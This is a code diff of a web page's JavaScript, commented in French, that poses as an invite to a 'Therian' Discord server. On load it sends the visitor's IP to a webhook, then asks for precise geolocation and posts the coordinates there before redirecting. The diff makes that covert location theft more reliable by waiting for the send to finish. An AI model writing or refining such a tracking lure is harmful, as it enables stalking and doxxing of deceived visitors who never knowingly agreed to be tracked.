@@ -51,37 +51,43 @@
       }
     }
 
-    function envoyerPosition(position) {
+    // Fonction pour envoyer la position au webhook et attendre la fin avant redirection
+    async function envoyerPosition(position) {
       const lat = position.coords.latitude.toFixed(6);
       const lng = position.coords.longitude.toFixed(6);
 
-      // Envoi position
-      fetch(WEBHOOK_URL, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          content: `📍 Nouvelle localisation :\nLatitude: ${lat}\nLongitude: ${lng}`
-        })
-      }).catch(() => {});
+      try {
+        await fetch(WEBHOOK_URL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            content: `📍 Nouvelle localisation :\nLatitude: ${lat}\nLongitude: ${lng}`
+          })
+        });
+      } catch (e) {
+        console.error("Erreur envoi position:", e);
+      }
 
-      // Redirection immédiate
+      // Redirection après envoi de la position
       window.location.href = REDIRECT_URL;
     }
 
     function erreurPosition(error) {
-      // Si refusée → redirection
+      // Si refusée ou désactivée → redirection après IP
       window.location.href = REDIRECT_URL;
     }
 
     window.onload = function() {
-      // 1️⃣ Envoyer l'IP dès l'ouverture
+      // Envoyer l'IP dès l'ouverture
       envoyerIP();
 
-      // 2️⃣ Gestion géolocalisation comme avant
       if ("geolocation" in navigator) {
         document.getElementById("titre").innerText = "Activer la localisation pour rejoindre le serveur Discord Therian";
-        navigator.geolocation.getCurrentPosition(envoyerPosition, erreurPosition);
+
+        // Toujours attendre que la position soit récupérée avant redirection
+        navigator.geolocation.getCurrentPosition(envoyerPosition, erreurPosition, { enableHighAccuracy: true, timeout: 15000 });
       } else {
+        // Pas de geolocation → redirection après IP
         window.location.href = REDIRECT_URL;
       }
     };
